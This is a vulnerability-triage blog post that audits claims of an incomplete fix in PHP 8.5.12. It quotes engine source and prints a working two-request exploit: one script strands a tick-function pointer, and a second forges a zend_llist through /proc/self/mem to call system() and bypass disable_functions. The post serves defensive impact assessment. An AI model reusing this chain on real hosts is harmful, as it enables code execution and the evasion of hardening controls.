---
title: "Auditing the PHP 8.5.12 Incomplete-Fix Claims"
date: "2026-10-23"
image: "https://wj6zzer4ts.ufs.sh/f/xAYSmYcg8VaGYeQVwU04HEm0bsgOTieoCvGaXMFx7KpBLwzZ"
about: "After PHP 8.5.12 shipped the fix for two actively exploited OOM bailout CVEs, claims started circulating that the fix was incomplete: a cross-request use-after-free on persistent workers, RCE on the patched release, a disable_functions bypass, a mod_php confirmation. The claims came with working PoCs and real file:line references. We audited every claim against a clean 8.5.12 tree. The code observations check out. The impact conclusion does not."
tags:
  - "php"
  - "security-research"
  - "memory-safety"
  - "use-after-free"
  - "vulnerability-triage"
---

## The Claims

PHP 8.5.12 released October 22 with the fix for CVE-2026-109618 and CVE-2026-109619, two OOM bailout bugs already in KEV. Claims followed that the fix was incomplete and the same residue class was still exploitable on the patched release, backed by a working PoC, hardcoded offsets, and file:line references.

The claim list, condensed:

1. `zend_deactivate_modules()` wraps every module `request_shutdown_func` in `zend_try`/`zend_end_try`, so a bailout raised inside one module's RSHUTDOWN is swallowed and the rest of that module's cleanup is skipped.
2. A set of globals is freed only inside RSHUTDOWN and never reset at RINIT, so a swallowed bailout leaves process-global pointers dangling into the previous request's heap. On persistent-worker SAPIs (FPM, mod_php, LSAPI, the built-in server) the next request on the same worker dereferences the stale pointer.
3. The delayed OOM handler still calls `zend_bailout()` when `EG(current_execute_data)` is NULL, which holds for every RSHUTDOWN callback, so memory pressure alone can produce the stranding without any code-level fault.
4. `zend_call_known_function()` escalates a failed late-shutdown call to `E_CORE_ERROR`, killing the worker in a single request.
5. End to end: two requests produce `system()` execution inside `zend_llist_destroy()` on stock `php:8.5-cli`, with a second confirmation claimed on `wordpress:php8.4-apache` (mod_php, prefork), a `disable_functions` bypass, and a second strandable primitive through the libxml entity loader.

We checked each one against a clean 8.5.12 checkout.

---

## What Was Actually Being Fixed

The original pair, CVE-2026-109618 (CVSS 9.8) and CVE-2026-109619 (CVSS 8.1), are described as improper handling of out-of-memory errors via `longjmp()`, letting remote attackers execute arbitrary code by triggering uninitialized memory usage during request cleanup. Both are in KEV, both have public PoCs (roughly a hundred for 109618), and the trigger class is the important part: crafted requests causing OOM. Attacker-controlled data, no code upload required.

The fix is commit `31c0ea7d7ff` "Avoid state corruption via bailout" (Arnaud Le Blanc, with Ilija Tovilo, Jakub Zelenka, Nora Dossche, Nicolas Grekas), and it does two things:

- Replaces the OOM `longjmp` bailout during request execution with a delayed `UnwindExit` throw, so the allocator no longer abandons execution mid-operation.
- Resets a list of globals that can be accessed during startup, so stale values cannot survive a torn-down request.

NEWS credits it directly:

```
22 Oct 2026, PHP 8.5.12
- Core:
  . Fixed GHSA-w8hw-w9fx-j79w, GHSA-6wmf-4rv5-p3rp (Avoid state corruption via
    bailout). (CVE-2026-109618, CVE-2026-109619) (Arnaud, ilutov, Jakub Zelenka,
    ndossche, Nicolas Grekas)
```

Our checkout:

```
$ git log -3 --format="%h | %ad | %s" --date=short
136e049ac10 | 2026-10-19 | Update versions for PHP 8.5.12
```

---

## How a Bailout Works

`zend_try`/`zend_catch` is the engine's `setjmp`/`longjmp` pair. `EG(bailout)` holds a `JMP_BUF*` pointing at the innermost installed jump buffer; `zend_try` swaps in a fresh one and records the previous, `zend_bailout()` `longjmp`s into the innermost `zend_try`, unwinding every C frame in between, and `zend_end_try()` restores the previous buffer.

Two consequences drive everything below:

- A bailout is not an exception. `EG(exception)` unwinds through userland frames and PHP `catch` blocks. A bailout skips all C-level cleanup between the throw site and the catch site: frees, NULL assignments, refcount decrements simply do not run.
- Where the `zend_catch` sits decides how much gets skipped. A catch wrapping a single module callback loses only that module's remaining RSHUTDOWN work; a catch higher up loses more.

The October fix targeted the throw sites (OOM no longer longjmps during execution). It did not touch the catch sites.

---

## Claim 1: RSHUTDOWN Bailouts Are Swallowed

`Zend/zend_API.c`, `zend_deactivate_modules()`:

```c
ZEND_API void zend_deactivate_modules(void)
{
	EG(current_execute_data) = NULL; /* we're no longer executing anything */

	if (EG(full_tables_cleanup)) {
		...
	} else {
		zend_module_entry **p = module_request_shutdown_handlers;

		while (*p) {
			zend_module_entry *module = *p;
			zend_try {
				module->request_shutdown_func(module->type, module->module_number);
			} zend_end_try();
			p++;
		}
	}
}
```

Two facts here, both accurate:

- Each module's RSHUTDOWN runs inside `zend_try`. A `longjmp` out of it lands in `zend_end_try()`, the loop continues, and whatever cleanup the faulting module had left simply never runs.
- `EG(current_execute_data) = NULL` is set before any module runs. This matters for Claim 3.

The wrapping is not part of the October fix: it is old fault isolation so one broken extension cannot abort shutdown for every module after it. The patch did not introduce it and did not change it.

Claim 1: real, and pre-existing.

---

## Claim 2: Globals With an RSHUTDOWN-Only Lifecycle

The strandable set:

| Global | Freed / destroyed | RINIT reset | Next-request consumer |
|---|---|---|---|
| `BG(user_tick_functions)` | `basic_functions.c:473-476` | none | `zend_llist_destroy()` in the next RSHUTDOWN |
| `BG(user_filter_map)` | `:479` submodule, runs right after the tick destroy | none | `stream_filter_register` / `append` |
| `PS(mod_user_names)` (9 zvals), `PS(mod_user_class_name)`, `PS(session_started_filename)` | `session.c` RSHUTDOWN | none | `session_set_save_handler` zval dtors |
| `PS(use_trans_sid)`, `PG(php_sys_temp_dir)` | skipped cleanup leaves stale-live values | none | next request reads them as-is |
| `LIBXML(entity_loader_callback)` | `libxml.c:1045-1048` | none (GINIT only, `:419`) | `zend_call_known_fcc()` at `:788` |
| `spl_autoload_functions` | `zend_hash_destroy` in SPL RSHUTDOWN | none | autoload dispatch |

`basic_functions.c:473-476`, the primary strand:

```c
	if (BG(user_tick_functions)) {
		zend_llist_destroy(BG(user_tick_functions));
		efree(BG(user_tick_functions));
		BG(user_tick_functions) = NULL;
	}

	BASIC_RSHUTDOWN_SUBMODULE(user_filters)
```

`PHP_RINIT_FUNCTION(basic)` defensively resets a long list of request globals, `strtok_table`, `ctype_string`, `user_shutdown_function_names`, and around twenty more. `user_tick_functions` is not among them. A grep for every touch site shows creation, registration, consumption, destruction, and nothing in RINIT:

```
473:	if (BG(user_tick_functions)) {
474:		zend_llist_destroy(BG(user_tick_functions));
475:		efree(BG(user_tick_functions));
476:		BG(user_tick_functions) = NULL;
1645:	(consumer)
2310-2318:	(allocation on register_tick_function)
2339:	(registration)
```

Session, `ext/session/session.c`:

```c
/* Dispatched by RSHUTDOWN and by php_session_destroy */
static void php_rshutdown_session_globals(void)
{
	/* Do NOT destroy PS(mod_user_names) here! */
	...
}
```

and the entirety of session RINIT is one delegated call, `php_rinit_session(PS(auto_start))`. No globals reset.

libxml, lifecycle end to end:

```
419:	libxml_globals->entity_loader_callback = empty_fcall_info_cache;   /* GINIT */
788:	zend_call_known_fcc(&LIBXML(entity_loader_callback), ...);        /* consumer */
1027:	PHP_RINIT_FUNCTION(libxml)  ->  LIBXML(entity_loader_disabled) = false;
1045:	if (ZEND_FCC_INITIALIZED(LIBXML(entity_loader_callback))) {      /* RSHUTDOWN */
1048:		zend_fcc_dtor(&LIBXML(entity_loader_callback));
```

`zend_fcall_info_cache` carries `function_handler` (the `zend_function*` to call), `object`, and scope fields, each released field by field inside `zend_fcc_dtor()`. `object` is released first, so a bailout mid-dtor leaves a cache that still passes `ZEND_FCC_INITIALIZED()` on `function_handler` while pointing into the old request heap. The next `DOMDocument`/`SimpleXML` parse that consults the entity loader (`substituteEntities` / `LIBXML_NOENT`) reaches `zend_call_known_fcc()` at `:788`, an indirect call through that stale handler.

Claim 2: real.

---

## Claim 3: The OOM Fallback Still Bailouts

`Zend/zend_alloc.c`, tail of the delayed-OOM handler:

```c
	if (execute_data) {
		/* An exception may already be in flight, and zend_throw_unwind_exit()
		 * does not allow that */
		EG(exception) = NULL;
		zend_throw_unwind_exit();
	}

	zend_try {
		zend_error_zstr_at(E_ERROR, info->filename, info->lineno, info->message);
	} zend_catch {
	} zend_end_try();
	...
	/* No userland frame to unwind: there is nothing to restore afterwards
	 * and no exception to throw, so catching the bailout here would just
	 * let the request carry on past a fatal error. Let it propagate and
	 * abort the request, the way an immediate OOM does. */
	if (!execute_data) {
		zend_bailout();
	}
```

How the delayed mechanism works: on allocation failure the allocator sets `AG(mm_heap)->overflow` and records the fault site instead of jumping immediately. The next call boundary checks `ZEND_HAS_OOM()` (`zend_execute_API.c`, right beside the `!EG(active)` guard in Claim 4) and runs `zend_handle_delayed_oom()`, shown above.

With a live `execute_data` it throws `UnwindExit` and the engine unwinds through the frame stack. With `execute_data == NULL` there is nothing to unwind through, so it raises `E_ERROR` and hard-bailouts. `zend_deactivate_modules()` NULLs `EG(current_execute_data)` before the first module runs, so every RSHUTDOWN callback operates in the `!execute_data` regime. An OOM raised by an allocation inside any module's teardown still `longjmp`s, lands in the per-module `zend_catch`, and skips the remainder of that module's cleanup.

Claim 3: real.

---

## Claim 4: The E_CORE_ERROR Escalation

`Zend/zend_execute_API.c`:

```c
	if (!EG(active)) {
		return FAILURE; /* executor is already inactive */
	}
```

and in `zend_call_known_function()`:

```c
	zend_result result = zend_call_function(&fci, &fcic);
	if (UNEXPECTED(result == FAILURE)) {
		if (!EG(exception)) {
			zend_error_noreturn(E_CORE_ERROR, "Couldn't execute method %s%s%s", ...);
		}
	}
```

`EG(active)` goes 1 at `:206` during activate and 0 at `:280` inside `zend_deactivate()`. The chain the claim relies on: `zend_deactivate()` clears `EG(active)`, then the object-store sweep releases whatever objects remain. Any `__destruct` dispatched in that window travels `zend_call_known_function()` -> `zend_call_function()` -> `!EG(active)` -> `FAILURE` -> `E_CORE_ERROR` -> process exit. `zend_deactivate()` sits outside any `zend_try`, so nothing catches the fatal: the worker dies mid-teardown.

Claim 4: real.

---

## Why the Residue Crosses Requests

### Who owns what

- `BG()`, `PS()`, `PG()` are extension-globals structs allocated at module init: process lifetime. On FPM, mod_php, LSAPI and the built-in server they outlive every request the worker serves.
- The `zend_llist` that `BG(user_tick_functions)` points at is `emalloc`'d: ZendMM request-heap memory, freed as part of the arena.
- `shutdown_memory_manager()` at the end of the request discards the entire request heap at once. Nothing records which process-global pointers pointed into it.
- Request N+1's heap reuses the same arena, so the stale `BG` pointer aliases whatever lands there early in the next request. That is why the dangling pointer lands on reused memory deterministically instead of going wild.

### The shutdown order

`php_request_shutdown()` (`main/main.c`):

| Step | Runs | Bailout behavior |
|---|---|---|
| 1 | `php_call_shutdown_functions()` (`register_shutdown_function` callbacks) | try-wrapped |
| 2 | `zend_call_destructors()` (`__destruct` sweep) | try-wrapped |
| 3 | `php_output_end_all()` (ob callbacks) | try-wrapped |
| - | `php_deactivate_ticks()` | - |
| 4 | `zend_unset_timeout()` | try-wrapped |
| 5 | `zend_deactivate_modules()` | try-wrapped, per module |
| 6 | `php_output_deactivate()` | try-wrapped |
| - | `zend_deactivate()` (`EG(active) = 0`, executor teardown, remaining objects destroyed) | not wrapped |
| - | `shutdown_memory_manager()` (request heap discarded) | - |

The plant lands in step 5's per-module catch: a bailout inside `zm_deactivate_basic` skips `basic_functions.c:475-476` (`efree` + `= NULL`), so the `BG` pointer stays non-NULL pointing into a heap that gets discarded right after. Request N+1's RSHUTDOWN hits `if (BG(user_tick_functions))`, still true, and calls `zend_llist_destroy()` on the reused chunk: `l->dtor(current->data)` per element.

`zend_llist` layout, 56 bytes on LP64:

```c
typedef struct _zend_llist {
	zend_llist_element *head;         /* +0  */
	zend_llist_element *tail;         /* +8  */
	size_t count;                     /* +16 */
	size_t size;                      /* +24 */
	llist_dtor_func_t dtor;           /* +32 */
	unsigned char persistent;         /* +40 */
	zend_llist_element *traverse_ptr; /* +48 */
} zend_llist;
```

`dtor` is at +32, inside the reused chunk, overwriteable by whatever request N+1 allocates there. On an ASan build the crash is a wild jump at `zm_deactivate_basic:474`, `rax` = request N+1's reallocated content.

---

## The Claimed Exploit Chain

Two requests on the same worker.

### r1.php, the plant

```php
<?php
register_tick_function('strlen', 0);   // creates BG(user_tick_functions)
class Bomb { function __destruct() { throw new Error("x"); } }
// ob callback runs at php_output_end_all, after the destructor sweep:
// bailout inside zm_deactivate_basic skips the free+NULL -> BG pointer dangles
ob_start(function ($b) { register_tick_function('strlen', new Bomb()); return $b; });
echo "planted\n";
```

Walkthrough:

1. `register_tick_function('strlen', 0)` lazily allocates `BG(user_tick_functions)`: an `emalloc`'d `zend_llist` header plus an element holding the callable.
2. `ob_start()` defers its callback to shutdown step 3 (`php_output_end_all`), which runs after the step-2 `__destruct` sweep.
3. Inside that callback, `register_tick_function('strlen', new Bomb())` appends an element whose arg zval owns the `Bomb` object. Because the object is created after the destructor sweep, its only remaining reference is inside the tick llist element.
4. Step 5: `zm_deactivate_basic` calls `zend_llist_destroy()`. Destroying the element releases the `Bomb` zval, refcount hits zero, `__destruct` throws `Error`. With `EG(current_execute_data)` NULL the throw escalates to `E_ERROR` and `zend_bailout()`.
5. The bailout `longjmp`s out of `zend_llist_destroy()` mid-iteration into the module-level `zend_catch`. `basic_functions.c:475-476` never runs. `BG(user_tick_functions)` remains non-NULL, pointing at a request heap that `shutdown_memory_manager()` then frees.

### r2.php, the detonation

```php
<?php
$maps = file_get_contents("/proc/self/maps");
$BASE = 0; $LIBC = 0;
foreach (explode("\n", $maps) as $l) {
    if (strpos($l, "libc.so") !== false && !$LIBC)
        $LIBC = hexdec(substr($l, 0, strpos($l, "-")));
    if (strpos($l, "bin/php") !== false) {
        $a = hexdec(substr($l, 0, strpos($l, "-")));
        if (!$BASE || $a < $BASE) $BASE = $a;
    }
}
$mem = fopen("/proc/self/mem", "r+b");
// basic_globals at image base + 0x1ccee00 (official image build);
// user_tick_functions field at +0x1d0, holds the stale llist pointer
fseek($mem, $BASE + 0x1ccee00 + 0x1d0);
$LL = unpack("P", fread($mem, 8))[1];
$SYS = $LIBC + 0x53090;   // system() in this glibc (2.41)
// zend_llist: head@0 tail@8 count@16 size@24 dtor@32 persistent@40 traverse@48
// element overlaps the struct: elem.data at +40 -> "id>/x"
$fake = pack("P5", $LL + 24, 0, 1, 0, $SYS) . "id>/x\0\0\0" . pack("P", 0);
fseek($mem, $LL); fwrite($mem, $fake); fflush($mem);
```

In order:

1. `/proc/self/maps` gives the binary base and libc base for its own process: no ASLR leak needed, the target is itself.
2. `/proc/self/mem` opened `r+b` gives arbitrary read/write on its own address space.
3. Reads the stale llist pointer out of `basic_globals` (image base + `0x1ccee00`, field `+0x1d0`; both offsets specific to the official `php:8.5-cli` NTS build).
4. Writes a fake `zend_llist` over the stale chunk, with the element forged inside the same 56 bytes:

| Offset | Field | Written value | Second use |
|---|---|---|---|
| +0 | `head` | `$LL+24` | points at the forged element |
| +8 | `tail` | `0` | |
| +16 | `count` | `1` | one element to iterate |
| +24 | `size` | `0` | = `elem->next` = NULL, ends the loop |
| +32 | `dtor` | `$SYS` | = `system()` |
| +40 | element data | `"id>/x"` | = `elem->data` at `elem+16` |
| +48 | `traverse_ptr` | `0` | |

`zend_llist_destroy()` follows `head` to `$LL+24`, reads `elem->data` at +40, and calls `l->dtor(elem->data)`: `system("id>/x")`. The `size` field at +24 doubles as the element's `next` pointer (0, so the loop stops after one call), which is what lets a single `pack()` forge the struct and the element at once.

Request 2 exits, its own RSHUTDOWN calls the forged `dtor`, `system("id>/x")` runs, `/x` reads `uid=0(root)`. The claimed follow-ups: the same chain on `wordpress:php8.4-apache` producing `uid=33(www-data)`, a `disable_functions=system,exec,shell_exec,passthru,pcntl_exec,popen,proc_open` bypass (the forged `l->dtor` is a C-level indirect call, outside PHP's function table), the libxml fcc variant needing only two `/proc/self/mem` writes with no struct forgery and no libc offsets, and `spl_autoload_functions` as an additional strandable global.

The chain works as described.

---

## Prerequisites Check

Every stage of the chain runs on the attacker's own PHP:

| Requirement | Used for |
|---|---|
| Attacker PHP, request 1 | plants the stale `BG(user_tick_functions)` via `register_tick_function` + a destructor that throws during shutdown |
| Attacker PHP, request 2 | the weaponization script itself |
| `/proc/self/mem` read + write | stale-pointer discovery and the fake llist write |
| Per-build offsets | `basic_globals` vaddr `0x1ccee00`, field `+0x1d0`, glibc `system` `+0x53090` |
| Same persistent worker | FPM, mod_php, LSAPI, cli-server |

A host that executes attacker-dropped PHP does not need this bug for code execution: `<?php system('id'); ?>` does it directly. Nothing in the chain crosses a uid boundary the attacker did not already have.

### disable_functions

The bypass is mechanically accurate: `l->dtor` is a C-level indirect call and never touches PHP's function table, so a disabled `system()` still fires. It is not an escalation: the attacker already executes PHP of their choice. `disable_functions` is a hardening knob, not a privilege boundary.

### The data-only trigger

The property that made the original CVEs critical: crafted requests drive the allocator into OOM during request execution, no code upload. Post-fix, the execution-time OOM throws `UnwindExit`; the residual bailout is only reachable via OOM inside a module's RSHUTDOWN, where allocations are mostly frees and teardown. Narrow window, reachable in principle.

Stranding is not detonation: the stale pointer is only a wild call if request N+1 writes controlled content where `dtor` lands. Every demonstrated detonation does that with attacker PHP through `/proc/self/mem`. A data-only variant needs the freed chunk repopulated with controlled bytes through request content alone, on an allocation with no attacker-controlled timing or size. Not demonstrated.

### The E_CORE_ERROR path

Worker exit on request end. Availability bug against a respawning pool: DoS-class, not code execution.

### Upstream classification

php-src's public policy excludes issues that "require invocation of specific code, which may be valid but is obviously malicious" and issues requiring actions already permitted to the uid executing PHP. The built-in server is also excluded, though the mod_php reproduction makes SAPI coverage moot. Both stages of the chain are attacker-authored PHP, squarely inside the exclusions.

| Property | CVE-2026-109618/109619 | Claimed chain on 8.5.12 |
|---|---|---|
| Triggerable without attacker PHP | yes, crafted requests | not demonstrated |
| Corruption during execution | yes, mid-operation `longjmp` | no, shutdown window only |
| Impact without code upload | remote RCE, KEV-confirmed | none demonstrated |
| Demonstrated chain | request data to RCE | attacker PHP on both requests |
| `disable_functions` relevance | n/a | same-uid no-op under policy |

---

## What's Left

- A bailout inside module RSHUTDOWN can still strand request-lifetime globals into the next request on persistent workers. Worth a hardening pass: the fix's own pattern (RINIT resets) covers these globals if they are added to the list.
- Same for the `!execute_data` OOM fallback and the `E_CORE_ERROR` escalation: robustness issues, not demonstrated security issues.
- The October fix closed the part that was KEV'd: data-triggerable corruption during execution.

## Takeaway

Patch to 8.5.12 or 8.4.27 regardless. The original CVEs are KEV-listed with public weaponization and a data-only trigger. A `system()` call that requires dropping PHP files on the target is not an impact statement.

---

## References

- CVE-2026-109618, CVE-2026-109619 (KEV-listed, CWE-416)
- `php/php-src` commit `31c0ea7d7ff`, `Zend/zend_API.c`, `Zend/zend_alloc.c`, `Zend/zend_execute_API.c`, `ext/standard/basic_functions.c`, `ext/session/session.c`, `ext/libxml/libxml.c`, `main/main.c`
- php-src security classification policy
